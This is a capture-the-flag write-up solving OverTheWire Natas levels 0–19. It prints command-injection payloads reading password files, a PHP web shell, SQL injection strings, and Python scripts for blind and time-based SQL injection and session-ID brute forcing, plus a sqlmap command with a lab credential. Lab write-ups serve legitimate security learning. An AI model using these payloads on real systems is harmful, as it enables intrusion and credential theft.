#### Writeup on https://overthewire.org/wargames/natas/

#### Level 0 → Level 1

The password is available in website source code.

#### Level 1 → Level 2

Can visit website source using `Ctrl + U`

#### Level 2 → Level 3

Browse to `/files/users.txt`

#### Level 3 → Level 4

Comment on website source says "Not even Google will find it this time", hence we go to `/robots.txt` from where we get to `/s3cr3t/users.txt`

#### Level 4 → Level 5

Need to modify "Referer" header to "http://natas5.natas.labs.overthewire.org/" in order to make the server think that we are coming from that domain.

#### Level 5 → Level 6

Set "loggedin" cookie's value to "1" using a cookie editing browser extension.

#### Level 6 → Level 7

Source code tells us that the password is located at "includes/secret.inc". Hence we browse to it to find a blank page but then find the secret in it's source. Submitting that on the form gives the password.

#### Level 7 → Level 8

IDOR available, i.e. any text passed to the `page` param is directly `cat`, hence utilizing hint in the website source we visit `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`.

#### Level 8 → Level 9

Reverse engineering the `encodeSecret()` function gets us the required password:

- convert the value of the `encodedSecret` variable to binary format using [hex2bin()](https://onlinephp.io/hex2bin)
- reverse the obtained output using the `rev` command and `base64` decode it: `echo ==QcCtmMml1ViV3b | rev | base64 -d`
- enter the obtained string in the form to get the password.

#### Level 9 → Level 10

Source code tells us that user input is being directly substituted in the command `grep -i $key dictionary.txt` hence giving [RCE](https://en.wikipedia.org/wiki/Remote_code_execution). Semicolons can be used to end have multiple commands on a single line, thus entering `; cat /etc/natas_webpass/natas10;` in the form gives us the password.

#### Level 10 → Level 11

The `preg_match()` function is checking for any character matching the regex `[;|&]` and hence we can't use semicolons anymore. We know that multiple files can be passed to `grep`, thus we pass the `/etc/natas_webpass/natas10` file to `grep` along with the "match everything" regex `.*` with the `-e` password: `-e ".*" /etc/natas_webpass/natas10`.

#### Level 11 → Level 12

The source code shows us an array with a `showpassword` parameter set to `no`. This array is JSON encoded, encrypted (with XOR), base64 encoded and then set as the `data` cookie. In order to make the backend PHP display the password, `showpassword` needs to be set to `yes`. Hence we need to forge such a cookie but for doing so we need to know the encryption key.

XORing the value stored in cookie with a JSON encoded base64 encoded array gives us the key. Using this key we encrypt the forged array resulting in a forged cookie. Editing the cookie in the browser to this cookie gets us the password.

#### Level 12 → Level 13

This level allows the client to upload an image file to the server. The uploaded file's name is set client-side, as a hidden `input` element. The extension in this client-side value can be modified to store any kind of file on the server.

Uploading a PHP script containing the following code: `<?php echo shell_exec($_GET['c'].' 2>&1'); ?>` gets us RCE on the server. This is because PHP blindly executes any PHP code it comes across.

- The `shell_exec` function can execute the provided argument as a shell command.
- `$_GET['c']` returns the value of the parameter `c` from the request.
- "." is the concatenation operator which converts both of the given operands to string type before combining them
- `' 2>&1'` ensures that terminal errors are also passed on to the `shell_exec` function i.e. it redirects `STDERR (&2)` to `STDOUT (&1)`

After uploading the script we get a URL to access it upon visiting which we see an error. This is because we haven't passed any parameters in the request. On sending another request with the parameter `c` set to `URL?c=cat /etc/natas_webpass/natas13` we get the password.

#### Level 13 → Level 14

This level is similar to the previous level except that here the [`exif_imagetype`](https://www.php.net/manual/en/function.exif-imagetype.php) function is used for checking that the uploaded file is indeed an image. If it's not an error is displayed. By going through the function's manual we realize that only the magic text of the file i.e. the first few characters which are an indicator of the file format are the only one's that are checked. Hence as referenced at https://stackoverflow.com/a/66094894 we can add some magic characters to the beginning of our PHP script using Python after which we will be able to upload it and get the password.

#### Level 14 → Level 15

SQL Injection: `natas15" or 1=1;-- -` as username with an empty password.

#### Level 15 → Level 16

There is a single username text input which can be used to confirm if a certain user exists or not. Trying `natas16` as the username gets us the reply that the user exists.

As there is no way to test the password, we need to use Blind SQL Injection to get the password.. We start by finding the characters that exist in the password using SQL `LIKE` passing the wildcard `%<character>%` where `%` refers to any number of characters. From previous levels, we know that the password is 32 characters long. Hence in the next step, we obtain the password character by character, except that in this case the wildcard is placed only at the trailing end,

`BINARY` makes the query case-sensitive. `#` is a comment style specific to MySQL servers.

```
import requests

from requests.auth import HTTPBasicAuth
Auth = HTTPBasicAuth('natas15', 'PASSWORD')

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''

for char in chars:
    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=Auth, data = Data)
    if 'exists' in r.text :
        filtered += char
print(filtered)

passwd = ''
for i in range(0,32):
    for char in filtered:
        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=Auth, data = Data)
        if 'exists' in r.text :
            passwd += char
            print(passwd)
```

#### Level 16 → Level 17

This level is similar to Level 10 wherein we could search a dictionary by providing search terms via a textbox. The difference here is that the user input is surrounded with quotes hence the previous method can't be used. Instead we use command substitution and an approach similar to the previous Level 15 to obtain the password.

If a certain character is present in the password, the inner `grep` will return text causing the outer `grep` to fail: the word "kitten" won't be found (as there would be additional text preceding it) and hence it won't be in the response. This is our clue to include that character in the `filtered` variable. After this we fix the password obtained so far at the beginning of the search term for the inner `grep`, followed by a character from the `filtered` variable. Eventually we get a 32 character string which is the required password.

```
import requests
from requests.auth import HTTPBasicAuth
Auth = HTTPBasicAuth('natas16', 'PASSWORD')

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''

for char in chars:
    r = requests.post('http://natas16.natas.labs.overthewire.org/index.php', auth=Auth,
        data = {'submit' : 'Search', 'needle':'$(grep {} /etc/natas_webpass/natas17)kitten'.format(char)})
    print(r.text)
    if 'kitten' not in r.text:
        filtered += char
print(filtered)

passwd = ''
for i in range(0,32):
    for char in filtered:
        r = requests.post('http://natas16.natas.labs.overthewire.org/index.php', auth=Auth,
            data = {'submit' : 'Search', 'needle':'$(grep ^{} /etc/natas_webpass/natas17)kitten'.format(passwd + char)})
        if 'kitten' not in r.text:
            passwd += char
            print(passwd)
```

#### Level 17 → Level 18

This level is similar to the previous level but there is no feedback as to whether the user exists or not. Hence we need to use Time-Based Blind SQLi to derive the password.

Initially we decide to go with a python script and pen this:

```
import requests

from requests.auth import HTTPBasicAuth
Auth = HTTPBasicAuth('natas17', 'PASSWORD')

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
max_time_taken = 0
max_character = ""
passwd = ""

for j in range(32):
    for char in chars:
        Data = {'username': 'natas18" and password={}; #'.format(
            passwd + char)}
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php',auth=Auth, data=Data)
        t = r.elapsed.total_seconds()
        if t > max_time_taken:
            max_time_taken = t
            max_character = char
    passwd += max_character
    print(passwd)
```

But the script was too slow so we switch to [sqlmap](https://sqlmap.org/). This will be faster as the website's source code provides us several SQL parameters such as the database server type (MySQL), database name, table name etc.

```
sqlmap --url "http://natas17.natas.labs.overthewire.org/index.php" --auth-type Basic --auth-cred "natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd" --data="username=natas18" --risk 3 --level 5 --dbms mysql -vv --batch --sql-shell
```

Followed by the SQL query: `SELECT password FROM users;` and a lot (at least half an hour) of waiting gets us four records (passwords), the last of which works successfully.

For some unknown reason `SELECT password FROM users WHERE username=natas18;` failed to work.

#### Level 18 → Level 19

In the source code we see a `createID()` function which returns a number that is fed into the `PHPSESSID` cookie as seen here:

```
session_id(createID($_REQUEST["username"]));
session_start();
```

In order to login as admin we need to [hijack the admin session](https://en.wikipedia.org/wiki/Session_hijacking) by brute-forcing their unique cookie number. This can be done by successively sending requests using the Python `requests` library while incrementing the cookie number by one for each request, until the success message is present in the response.

We write the following python script using the `grequests` library instead as it sends requests parallelly increasing the speed.

```
import grequests
from requests.auth import HTTPBasicAuth

COOKIE_MAX = 641
Auth = HTTPBasicAuth('natas18', 'PASSWORD')

requests = []
for i in range(1, COOKIE_MAX):
    Headers = {"Cookie": "PHPSESSID={}".format(str(i))}
    r = grequests.get('http://natas18.natas.labs.overthewire.org/index.php',
                      auth=Auth, headers=Headers)
    requests.append(r)

responses = grequests.map(requests)
for r in responses:
    response = r.content.decode()
    if "You are an admin" in response:
        print(response[response.index("Username"):])
        break
```

#### Level 19 → Level 20

In this level, the link to the source code not provided navigating to [/index-source.html](http://natas19.natas.labs.overthewire.org/index-source.html) reveals it. We see that the `$maxid` variable is still capped at 640 but the `createID` function has been slightly modified:

```
function createID($user) {
    global $maxid;
    $idnum = rand(1, $maxid);
    $idstr = "$idnum-$user";
    return bin2hex($idstr);
}
```

The cookie now contains the hexadecimal version of the random number followed by a hyphen and the username. We modify our previous python script to reverse engineer this mechanism and that gets us the password.

```
import binascii
import grequests
from requests.auth import HTTPBasicAuth

COOKIE_MAX = 641
Auth = HTTPBasicAuth('natas19', 'PASSWORD')

requests = []
for i in range(1, COOKIE_MAX):
    cookie_text = "{}-admin".format(str(i)).encode()
    cookie = binascii.hexlify(cookie_text).decode()
    Headers = {"Cookie": "PHPSESSID={}".format(cookie)}
    r = grequests.get('http://natas19.natas.labs.overthewire.org/index.php',
                      auth=Auth, headers=Headers)
    requests.append(r)

responses = grequests.map(requests)
for r in responses:
    response = r.content.decode()
    if "You are an admin" in response:
        print(response[response.index("Username"):])
        break
```

#### End of writeup
